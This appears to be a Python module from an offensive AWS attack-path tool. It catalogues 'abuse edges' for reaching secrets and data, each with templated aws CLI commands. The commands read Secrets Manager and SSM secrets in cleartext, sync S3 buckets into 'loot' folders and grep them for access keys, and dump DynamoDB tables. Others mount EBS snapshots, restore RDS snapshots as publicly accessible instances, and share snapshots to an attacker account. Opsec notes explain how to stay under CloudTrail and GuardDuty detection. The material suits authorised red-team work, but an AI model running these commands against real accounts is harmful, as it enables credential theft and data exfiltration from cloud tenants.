"""Data & secrets edges: reaching stored credentials and sensitive data across
Secrets Manager, SSM Parameter Store, S3, KMS, DynamoDB, RDS/EBS snapshots, and
CloudWatch Logs.

Some of these are pure loot (S3 objects, DynamoDB rows). Others mint identity -
a secret or parameter frequently holds an access key, a DB password, or another
service's token, making GetSecretValue the cloud analogue of ReadLAPSPassword.
"""

from ..models import AbuseInfo, AbuseStep, BlastRadius, Platform

ABUSE_DB: dict[str, AbuseInfo] = {}


def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="") -> AbuseStep:
    return AbuseStep(
        description=desc,
        command=cmd,
        platform=Platform.LINUX,
        tool=tool,
        blast_radius=blast,
        api=api,
        opsec_note=opsec,
    )


# ─── GetSecretValue ─────────────────────────────────────────────────────────

ABUSE_DB["GetSecretValue"] = AbuseInfo(
    edge_kind="GetSecretValue",
    description=(
        "secretsmanager:GetSecretValue reads a secret in cleartext. Secrets "
        "routinely hold IAM access keys, database passwords, API tokens, and "
        "other service credentials - so this is often a direct identity gain, "
        "the AWS analogue of reading a LAPS password."
    ),
    required_permissions=["secretsmanager:GetSecretValue"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["Secret"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "GetSecretValue is logged in CloudTrail and is a common detection "
        "trigger, especially in bulk. If the secret is KMS-encrypted with a CMK "
        "you also need kms:Decrypt on that key. Reading rotates nothing and "
        "leaves no state change."
    ),
    linux_steps=[
        _s(
            "Read the secret in cleartext",
            "aws secretsmanager get-secret-value {AWS_AUTH} \\\n"
            "  --secret-id '{SECRET_ID}' \\\n"
            "  --query SecretString --output text",
            api="secretsmanager:GetSecretValue",
        ),
        _s(
            "Scan the value for embedded AWS keys",
            "aws secretsmanager get-secret-value {AWS_AUTH} --secret-id '{SECRET_ID}' \\\n"
            "  --query SecretString --output text | grep -Eo 'AKIA[0-9A-Z]{16}'",
            tool="aws",
        ),
    ],
)


# ─── ReadSSMParameter ───────────────────────────────────────────────────────

ABUSE_DB["ReadSSMParameter"] = AbuseInfo(
    edge_kind="ReadSSMParameter",
    description=(
        "ssm:GetParameter(s) with --with-decryption reads SecureString "
        "parameters in cleartext. Parameter Store is the poor man's secrets "
        "vault - the same credential material lives here."
    ),
    required_permissions=["ssm:GetParameter"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["SSMParameter"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "SecureString decryption needs kms:Decrypt on the backing key. "
        "GetParameter is logged; GetParametersByPath lets you sweep an entire "
        "namespace in one call (and one log line)."
    ),
    linux_steps=[
        _s(
            "Read a single decrypted parameter",
            "aws ssm get-parameter {AWS_AUTH} \\\n"
            "  --name '{PARAM_NAME}' --with-decryption \\\n"
            "  --query Parameter.Value --output text",
            api="ssm:GetParameter",
        ),
        _s(
            "Sweep a whole path (recursive, decrypted)",
            "aws ssm get-parameters-by-path {AWS_AUTH} \\\n"
            "  --path '/' --recursive --with-decryption \\\n"
            "  --query 'Parameters[].[Name,Value]' --output text",
            api="ssm:GetParametersByPath",
        ),
    ],
)


# ─── ReadS3Object / ListS3Bucket / WriteS3Object ────────────────────────────

ABUSE_DB["ReadS3Object"] = AbuseInfo(
    edge_kind="ReadS3Object",
    description=(
        "s3:GetObject reads objects from a bucket. Buckets commonly hold "
        "backups, config files, .env files, terraform state, and credential "
        "material - frequently a source of the next identity."
    ),
    required_permissions=["s3:GetObject"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["S3Bucket"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "GetObject is only logged if S3 data events are enabled (they often are "
        "not). Bulk downloads can trip GuardDuty S3 exfiltration heuristics "
        "when data events ARE on."
    ),
    linux_steps=[
        _s(
            "List then pull an object",
            "aws s3 ls s3://{BUCKET}/ --recursive {AWS_AUTH}\n"
            "aws s3 cp s3://{BUCKET}/{KEY} - {AWS_AUTH}",
            api="s3:GetObject",
        ),
        _s(
            "Grep synced content for credentials",
            "aws s3 sync s3://{BUCKET}/ ./loot-{BUCKET} {AWS_AUTH} && \\\n"
            "  grep -rEn 'AKIA[0-9A-Z]{16}|aws_secret_access_key|password' ./loot-{BUCKET}",
            api="s3:GetObject",
        ),
    ],
)

ABUSE_DB["ListS3Bucket"] = AbuseInfo(
    edge_kind="ListS3Bucket",
    description=(
        "s3:ListBucket enumerates object keys, revealing what is worth "
        "fetching. Loot-only on its own; pairs with ReadS3Object."
    ),
    required_permissions=["s3:ListBucket"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["S3Bucket"],
    blast_radius=BlastRadius.READ,
    opsec_considerations="Cheap and quiet. Use it to target GetObject rather than blindly syncing.",
    linux_steps=[
        _s(
            "List all keys in the bucket",
            "aws s3api list-objects-v2 {AWS_AUTH} --bucket '{BUCKET}' \\\n"
            "  --query 'Contents[].Key' --output text",
            api="s3:ListBucket",
        ),
    ],
)

ABUSE_DB["WriteS3Object"] = AbuseInfo(
    edge_kind="WriteS3Object",
    description=(
        "s3:PutObject writes to a bucket. Escalation potential depends on what "
        "consumes the bucket: Lambda/Glue triggers, CloudFormation templates, "
        "config or website content, CI/CD input, or terraform state that gets "
        "applied."
    ),
    required_permissions=["s3:PutObject"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["S3Bucket"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Overwriting existing objects is destructive - back up the original "
        "first. Poisoning a build/deploy input can execute in a privileged "
        "context far from you."
    ),
    linux_steps=[
        _s(
            "Upload/overwrite an object",
            "aws s3 cp ./payload s3://{BUCKET}/{KEY} {AWS_AUTH}",
            api="s3:PutObject",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── KMSDecrypt ─────────────────────────────────────────────────────────────

ABUSE_DB["KMSDecrypt"] = AbuseInfo(
    edge_kind="KMSDecrypt",
    description=(
        "kms:Decrypt turns ciphertext (from a secret, parameter, encrypted S3 "
        "object, or envelope-encrypted blob) into plaintext. Often the missing "
        "link that makes another read edge actually yield cleartext."
    ),
    required_permissions=["kms:Decrypt"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["KMSKey"],
    blast_radius=BlastRadius.READ,
    opsec_considerations=(
        "Decrypt is logged with the key id and (optionally) encryption context. "
        "The key POLICY, not just your IAM policy, must permit you - that is why "
        "kms:Decrypt sometimes fails even with a matching IAM grant."
    ),
    linux_steps=[
        _s(
            "Decrypt a ciphertext blob",
            "aws kms decrypt {AWS_AUTH} \\\n"
            "  --ciphertext-blob fileb://cipher.bin \\\n"
            "  --key-id '{KEY_ID}' --query Plaintext --output text | base64 -d",
            api="kms:Decrypt",
        ),
    ],
)


# ─── DynamoDBScan ───────────────────────────────────────────────────────────

ABUSE_DB["DynamoDBScan"] = AbuseInfo(
    edge_kind="DynamoDBScan",
    description=(
        "dynamodb:Scan dumps an entire table. Application tables frequently "
        "hold session tokens, API keys, password hashes, and PII."
    ),
    required_permissions=["dynamodb:Scan"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["DynamoDBTable"],
    blast_radius=BlastRadius.READ,
    opsec_considerations="Full scans are expensive and (with data events) visible. Target attributes you care about.",
    linux_steps=[
        _s(
            "Dump the table",
            "aws dynamodb scan {AWS_AUTH} --table-name '{TABLE_NAME}'",
            api="dynamodb:Scan",
        ),
    ],
)


# ─── EBS snapshot chain ─────────────────────────────────────────────────────

ABUSE_DB["CreateEBSSnapshot"] = AbuseInfo(
    edge_kind="CreateEBSSnapshot",
    description=(
        "ec2:CreateSnapshot of a volume you cannot otherwise read, then mount "
        "the snapshot on an instance you control - a classic way to reach an "
        "instance's disk (and its secrets) without touching the instance."
    ),
    required_permissions=["ec2:CreateSnapshot", "ec2:CreateVolume", "ec2:AttachVolume"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EBSVolume"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Snapshots are billable artifacts - delete them in cleanup.",
    linux_steps=[
        _s(
            "Snapshot the target volume",
            "aws ec2 create-snapshot {AWS_AUTH} \\\n"
            "  --volume-id '{VOLUME_ID}' --description 'awspwn'",
            api="ec2:CreateSnapshot",
            blast=BlastRadius.MUTATE,
        ),
        _s(
            "Create a volume from it and attach to your instance, then mount",
            "aws ec2 create-volume {AWS_AUTH} --snapshot-id '{SNAPSHOT_ID}' --availability-zone '{AZ}'\n"
            "aws ec2 attach-volume {AWS_AUTH} --volume-id '{NEW_VOLUME_ID}' --instance-id '{MY_INSTANCE}' --device /dev/xvdf",
            api="ec2:CreateVolume",
            blast=BlastRadius.MUTATE,
        ),
    ],
)

ABUSE_DB["ShareEBSSnapshot"] = AbuseInfo(
    edge_kind="ShareEBSSnapshot",
    description=(
        "ec2:ModifySnapshotAttribute shares a snapshot with an external "
        "account you control, letting you reconstruct and mount the disk "
        "outside the target's boundary."
    ),
    required_permissions=["ec2:ModifySnapshotAttribute"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EBSSnapshot"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations=(
        "Sharing data outside the account boundary is the single most sensitive "
        "action in this class - it can expose regulated data and is caught by "
        "Access Analyzer. Requires --allow-external and an explicit attacker "
        "account. Reversible by removing the share attribute."
    ),
    linux_steps=[
        _s(
            "Share the snapshot with your account",
            "aws ec2 modify-snapshot-attribute {AWS_AUTH} \\\n"
            "  --snapshot-id '{SNAPSHOT_ID}' --attribute createVolumePermission \\\n"
            "  --operation-type add --user-ids '{ATTACKER_ACCOUNT}'",
            api="ec2:ModifySnapshotAttribute",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: unshare the snapshot",
            command="aws ec2 modify-snapshot-attribute {AWS_AUTH} --snapshot-id '{SNAPSHOT_ID}' --attribute createVolumePermission --operation-type remove --user-ids '{ATTACKER_ACCOUNT}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="ec2:ModifySnapshotAttribute",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["CreateVolumeFromSnapshot"] = AbuseInfo(
    edge_kind="CreateVolumeFromSnapshot",
    description=(
        "ec2:CreateVolume from an existing (possibly public or shared) snapshot, "
        "then attach and mount it to read its filesystem."
    ),
    required_permissions=["ec2:CreateVolume", "ec2:AttachVolume"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["EBSSnapshot"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations="Works on snapshots shared to you or made public by misconfiguration.",
    linux_steps=[
        _s(
            "Create a volume from the snapshot and attach it",
            "aws ec2 create-volume {AWS_AUTH} --snapshot-id '{SNAPSHOT_ID}' --availability-zone '{AZ}'\n"
            "aws ec2 attach-volume {AWS_AUTH} --volume-id '{NEW_VOLUME_ID}' --instance-id '{MY_INSTANCE}' --device /dev/xvdf",
            api="ec2:CreateVolume",
            blast=BlastRadius.MUTATE,
        ),
    ],
)


# ─── RDS snapshot chain ─────────────────────────────────────────────────────

ABUSE_DB["RestoreRDSFromSnapshot"] = AbuseInfo(
    edge_kind="RestoreRDSFromSnapshot",
    description=(
        "rds:RestoreDBInstanceFromDBSnapshot spins up a NEW database from an "
        "existing snapshot with a master password you set, giving you full "
        "read access to data you could not otherwise query."
    ),
    required_permissions=["rds:RestoreDBInstanceFromDBSnapshot"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["RDSSnapshot"],
    blast_radius=BlastRadius.MUTATE,
    opsec_considerations=(
        "Restoring does not touch the original DB, but the new instance is "
        "billable and must be placed in a security group you can reach. Delete "
        "it in cleanup."
    ),
    linux_steps=[
        _s(
            "Restore a new instance from the snapshot into a reachable SG",
            "aws rds restore-db-instance-from-db-snapshot {AWS_AUTH} \\\n"
            "  --db-instance-identifier '{NEW_DB}' \\\n"
            "  --db-snapshot-identifier '{SNAPSHOT_ID}' \\\n"
            "  --publicly-accessible --vpc-security-group-ids '{SG_ID}'",
            api="rds:RestoreDBInstanceFromDBSnapshot",
            blast=BlastRadius.MUTATE,
        ),
        AbuseStep(
            description="Cleanup: delete the restored instance",
            command="aws rds delete-db-instance {AWS_AUTH} --db-instance-identifier '{NEW_DB}' --skip-final-snapshot",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.MUTATE,
            api="rds:DeleteDBInstance",
            is_cleanup=True,
        ),
    ],
)

ABUSE_DB["ShareRDSSnapshot"] = AbuseInfo(
    edge_kind="ShareRDSSnapshot",
    description=(
        "rds:ModifyDBSnapshotAttribute shares a DB snapshot with an external "
        "account you control, to restore and read it outside the target."
    ),
    required_permissions=["rds:ModifyDBSnapshotAttribute"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["RDSSnapshot"],
    blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
    opsec_considerations="Same external-data-exposure gravity as ShareEBSSnapshot. Reversible.",
    linux_steps=[
        _s(
            "Share the DB snapshot with your account",
            "aws rds modify-db-snapshot-attribute {AWS_AUTH} \\\n"
            "  --db-snapshot-identifier '{SNAPSHOT_ID}' \\\n"
            "  --attribute-name restore --values-to-add '{ATTACKER_ACCOUNT}'",
            api="rds:ModifyDBSnapshotAttribute",
            blast=BlastRadius.EXTERNAL_EXPOSURE,
        ),
        AbuseStep(
            description="Cleanup: unshare the snapshot",
            command="aws rds modify-db-snapshot-attribute {AWS_AUTH} --db-snapshot-identifier '{SNAPSHOT_ID}' --attribute-name restore --values-to-remove '{ATTACKER_ACCOUNT}'",
            platform=Platform.LINUX,
            tool="aws",
            blast_radius=BlastRadius.EXTERNAL_EXPOSURE,
            api="rds:ModifyDBSnapshotAttribute",
            is_cleanup=True,
        ),
    ],
)


# ─── RDSIAMConnect ──────────────────────────────────────────────────────────

ABUSE_DB["RDSIAMConnect"] = AbuseInfo(
    edge_kind="RDSIAMConnect",
    description=(
        "rds-db:connect lets an IAM principal authenticate to an RDS instance "
        "that has IAM database authentication enabled, using a short-lived "
        "token instead of a stored password."
    ),
    required_permissions=["rds-db:connect"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["RDSInstance"],
    blast_radius=BlastRadius.READ,
    opsec_considerations="Needs network reachability to the DB and IAM auth enabled on it.",
    linux_steps=[
        _s(
            "Generate an auth token and connect",
            "TOKEN=$(aws rds generate-db-auth-token {AWS_AUTH} --hostname '{DB_HOST}' --port 5432 --username '{DB_USER}')\n"
            "PGPASSWORD=\"$TOKEN\" psql -h '{DB_HOST}' -U '{DB_USER}' -d postgres",
            tool="psql",
        ),
    ],
)


# ─── ECRGetLoginPull ────────────────────────────────────────────────────────

ABUSE_DB["ECRGetLoginPull"] = AbuseInfo(
    edge_kind="ECRGetLoginPull",
    description=(
        "ecr:GetAuthorizationToken + pull permissions let you pull private "
        "container images and inspect their layers for baked-in secrets, "
        "source, and credentials."
    ),
    required_permissions=[
        "ecr:GetAuthorizationToken",
        "ecr:BatchGetImage",
        "ecr:GetDownloadUrlForLayer",
    ],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["ECRRepository"],
    blast_radius=BlastRadius.READ,
    opsec_considerations="Image pulls are logged; secrets in image layers are a very common finding.",
    linux_steps=[
        _s(
            "Authenticate docker to ECR and pull the image",
            "aws ecr get-login-password {AWS_AUTH} | docker login --username AWS --password-stdin {ACCOUNT_ID}.dkr.ecr.{REGION}.amazonaws.com\n"
            "docker pull {ACCOUNT_ID}.dkr.ecr.{REGION}.amazonaws.com/{REPO}:latest",
            tool="docker",
        ),
        _s(
            "Inspect layers for secrets",
            "docker history --no-trunc {REPO}:latest",
            tool="docker",
        ),
    ],
)


# ─── ReadCloudWatchLogs ─────────────────────────────────────────────────────

ABUSE_DB["ReadCloudWatchLogs"] = AbuseInfo(
    edge_kind="ReadCloudWatchLogs",
    description=(
        "logs:GetLogEvents / FilterLogEvents reads application logs, which "
        "routinely leak credentials, tokens, and query strings that developers "
        "assumed were private."
    ),
    required_permissions=["logs:FilterLogEvents"],
    source_kinds=["IAMUser", "IAMRole"],
    target_kinds=["CloudWatchLogGroup"],
    blast_radius=BlastRadius.READ,
    opsec_considerations="Quiet read. Filter for credential patterns rather than pulling everything.",
    linux_steps=[
        _s(
            "Search a log group for credential patterns",
            "aws logs filter-log-events {AWS_AUTH} \\\n"
            "  --log-group-name '{LOG_GROUP}' \\\n"
            "  --filter-pattern 'AKIA' --query 'events[].message'",
            api="logs:FilterLogEvents",
        ),
    ],
)
